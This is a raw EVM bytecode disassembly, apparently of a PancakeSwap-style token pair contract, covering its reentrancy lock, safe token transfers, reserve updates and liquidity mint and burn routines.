PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x18E2 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0x18F2 PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1946 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x195A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1970 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x19C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x19D7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0x1A0C DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A29 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x1A37 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0x1A70 JUMPI PUSH2 0x1A5B PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP PUSH2 0x1A6A PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1A90 JUMP JUMPDEST PUSH2 0x1A8D PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x1ACF JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25FF PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1AD9 DUP11 DUP11 PUSH2 0x2470 JUMP JUMPDEST POP PUSH2 0x1081 DUP7 DUP7 DUP11 DUP11 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x0 SWAP3 DUP4 MSTORE PUSH1 0x40 DUP1 DUP5 KECCAK256 SWAP1 SWAP2 MSTORE SWAP1 DUP3 MSTORE SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xA SLOAD DUP2 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x1B52 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH2 0x1C62 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1BA3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1BB7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1BCD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1C2E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1C44 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP2 PUSH1 0x1 PUSH1 0x70 SHL SWAP1 DIV AND PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x1 PUSH1 0xF SSTORE JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP1 DUP3 ADD DUP3 MSTORE PUSH1 0x19 DUP2 MSTORE PUSH32 0x7472616E7366657228616464726573732C75696E743235362900000000000000 PUSH1 0x20 SWAP2 DUP3 ADD MSTORE DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 DUP2 AND PUSH1 0x24 DUP4 ADD MSTORE PUSH1 0x44 DUP1 DUP4 ADD DUP7 SWAP1 MSTORE DUP5 MLOAD DUP1 DUP5 SUB SWAP1 SWAP2 ADD DUP2 MSTORE PUSH1 0x64 SWAP1 SWAP3 ADD DUP5 MSTORE SWAP2 DUP2 ADD DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH4 0xA9059CBB PUSH1 0xE0 SHL OR DUP2 MSTORE SWAP3 MLOAD DUP2 MLOAD PUSH1 0x0 SWAP5 PUSH1 0x60 SWAP5 DUP10 AND SWAP4 SWAP3 SWAP2 DUP3 SWAP2 SWAP1 DUP1 DUP4 DUP4 JUMPDEST PUSH1 0x20 DUP4 LT PUSH2 0x1D16 JUMPI DUP1 MLOAD DUP3 MSTORE PUSH1 0x1F NOT SWAP1 SWAP3 ADD SWAP2 PUSH1 0x20 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x1CF7 JUMP JUMPDEST PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB DUP1 NOT DUP3 MLOAD AND DUP2 DUP5 MLOAD AND DUP1 DUP3 OR DUP6 MSTORE POP POP POP POP POP POP SWAP1 POP ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1D78 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1D7D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 DUP1 ISZERO PUSH2 0x1DAB JUMPI POP DUP1 MLOAD ISZERO DUP1 PUSH2 0x1DAB JUMPI POP DUP1 DUP1 PUSH1 0x20 ADD SWAP1 MLOAD PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD JUMPDEST PUSH2 0x1DFC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x18 PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A205452414E534645525F4641494C45440000000000000000 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO DUP1 PUSH2 0x1E1E JUMPI POP POP DUP1 DUP3 MUL DUP3 DUP3 DUP3 DUP2 PUSH2 0x1E1B JUMPI INVALID JUMPDEST DIV EQ JUMPDEST PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6D756C2D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP1 DUP3 SUB DUP3 DUP2 GT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x15 PUSH1 0x24 DUP3 ADD MSTORE PUSH21 0x64732D6D6174682D7375622D756E646572666C6F77 PUSH1 0x58 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 GT DUP1 ISZERO SWAP1 PUSH2 0x1ED4 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 GT ISZERO JUMPDEST PUSH2 0x1F19 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x11 PUSH1 0x24 DUP3 ADD MSTORE PUSH17 0x50616E63616B653A204F564552464C4F57 PUSH1 0x78 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0xB SLOAD PUSH4 0xFFFFFFFF TIMESTAMP DUP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV DUP2 AND DUP3 SUB SWAP1 DUP2 AND ISZERO DUP1 ISZERO SWAP1 PUSH2 0x1F49 JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP5 AND ISZERO ISZERO JUMPDEST DUP1 ISZERO PUSH2 0x1F5D JUMPI POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP4 AND ISZERO ISZERO JUMPDEST ISZERO PUSH2 0x1FCE JUMPI DUP1 PUSH4 0xFFFFFFFF AND PUSH2 0x1F8B DUP6 PUSH2 0x1F76 DUP7 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x2568 AND JUMP JUMPDEST PUSH1 0xC DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE PUSH4 0xFFFFFFFF DUP2 AND PUSH2 0x1FB6 DUP5 PUSH2 0x1F76 DUP8 PUSH2 0x2556 JUMP JUMPDEST PUSH1 0xD DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP3 SWAP1 SWAP3 MUL ADD SWAP1 SSTORE JUMPDEST PUSH1 0xB DUP1 SLOAD PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP2 SWAP1 SWAP2 OR PUSH14 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFF PUSH1 0x70 SHL NOT AND PUSH1 0x1 PUSH1 0x70 SHL DUP9 DUP4 AND DUP2 MUL SWAP2 SWAP1 SWAP2 OR PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB AND PUSH1 0x1 PUSH1 0xE0 SHL PUSH4 0xFFFFFFFF DUP8 AND MUL OR SWAP3 DUP4 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP5 AND DUP2 MSTORE SWAP2 SWAP1 SWAP4 DIV SWAP1 SWAP2 AND PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD PUSH32 0x1C411E9A96E071241C2F21F7726B17AE89E3CAB4C78BE50E062B03A9FFFBBAD1 SWAP3 SWAP2 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG1 POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 DUP8 AND DUP1 DUP5 MSTORE SWAP5 DUP3 MSTORE SWAP2 DUP3 SWAP1 KECCAK256 DUP6 SWAP1 SSTORE DUP2 MLOAD DUP6 DUP2 MSTORE SWAP2 MLOAD PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2104 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP1 DUP3 KECCAK256 SWAP4 SWAP1 SWAP4 SSTORE SWAP1 DUP5 AND DUP2 MSTORE KECCAK256 SLOAD PUSH2 0x2139 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP2 DUP3 SWAP1 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP1 MLOAD DUP6 DUP2 MSTORE SWAP1 MLOAD SWAP2 SWAP4 SWAP3 DUP8 AND SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 SWAP2 DUP3 SWAP1 SUB ADD SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x17E7E58 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x21D4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x21E8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x21FE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0xE SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND ISZERO DUP1 ISZERO SWAP5 POP SWAP2 SWAP3 POP SWAP1 PUSH2 0x22E2 JUMPI DUP1 ISZERO PUSH2 0x22DD JUMPI PUSH1 0x0 PUSH2 0x2241 PUSH2 0xFC4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP9 DUP2 AND SWAP1 DUP9 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x224E DUP4 PUSH2 0x22F6 JUMP JUMPDEST SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x22DA JUMPI PUSH1 0x0 PUSH2 0x2281 PUSH1 0x8 PUSH2 0xB47 PUSH2 0x2272 DUP7 DUP7 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x22B6 PUSH2 0x2299 DUP5 PUSH1 0x8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22AA DUP7 PUSH1 0x11 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 DUP4 DUP2 PUSH2 0x22C3 JUMPI INVALID JUMPDEST DIV SWAP1 POP DUP1 ISZERO PUSH2 0x22D6 JUMPI PUSH2 0x22D6 DUP8 DUP3 PUSH2 0x2348 JUMP JUMPDEST POP POP POP JUMPDEST POP POP JUMPDEST PUSH2 0x22EE JUMP JUMPDEST DUP1 ISZERO PUSH2 0x22EE JUMPI PUSH1 0x0 PUSH1 0xE SSTORE JUMPDEST POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x3 DUP3 GT ISZERO PUSH2 0x2339 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x2 DUP3 DIV ADD JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x2333 JUMPI DUP1 SWAP2 POP PUSH1 0x2 DUP2 DUP3 DUP6 DUP2 PUSH2 0x2322 JUMPI INVALID JUMPDEST DIV ADD DUP2 PUSH2 0x232B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x230B JUMP JUMPDEST POP PUSH2 0x2343 JUMP JUMPDEST DUP2 ISZERO PUSH2 0x2343 JUMPI POP PUSH1 0x1 JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x235B SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x2386 SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP6 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 LT PUSH2 0x23DB JUMPI DUP2 PUSH2 0x23DD JUMP JUMPDEST DUP3 JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x240D SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 DUP2 KECCAK256 SWAP2 SWAP1 SWAP2 SSTORE SLOAD PUSH2 0x243A SWAP1 DUP3 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 LOG3 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH2 0x24CD JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x42455032303A206D696E7420746F20746865207A65726F206164647265737300 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x24E0 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x0 SWAP1 DUP2 SSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH2 0x250B SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x258D AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x3 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 SWAP5 SWAP1 SWAP5 SSTORE DUP4 MLOAD DUP7 DUP2 MSTORE SWAP4 MLOAD SWAP3 SWAP4 SWAP2 SWAP3 PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x264D DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP3 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 LOG3 POP PUSH1 0x1 SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND PUSH1 0x1 PUSH1 0x70 SHL MUL SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP3 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xE0 SHL SUB DUP5 AND DUP2 PUSH2 0x2585 JUMPI INVALID JUMPDEST DIV SWAP4 SWAP3 POP POP POP JUMP JUMPDEST DUP1 DUP3 ADD DUP3 DUP2 LT ISZERO PUSH2 0xC75 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x64732D6D6174682D6164642D6F766572666C6F77 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT INVALID POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x49 0x4E POP SSTORE SLOAD 0x5F COINBASE 0x4D 0x4F SSTORE 0x4E SLOAD SSTORE PUSH15 0x697377617056323A20494E53554646 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F 0x4D 0x49 0x4E SLOAD GASLIMIT DIFFICULTY POP PUSH2 0x6E63 PUSH2 0x6B65 GASPRICE KECCAK256 0x49 0x4E MSTORE8 SSTORE CHAINID CHAINID 0x49 NUMBER 0x49 GASLIMIT 0x4E SLOAD 0x5F 0x4C 0x49 MLOAD SSTORE 0x49 DIFFICULTY 0x49 SLOAD MSIZE 0x5F TIMESTAMP SSTORE 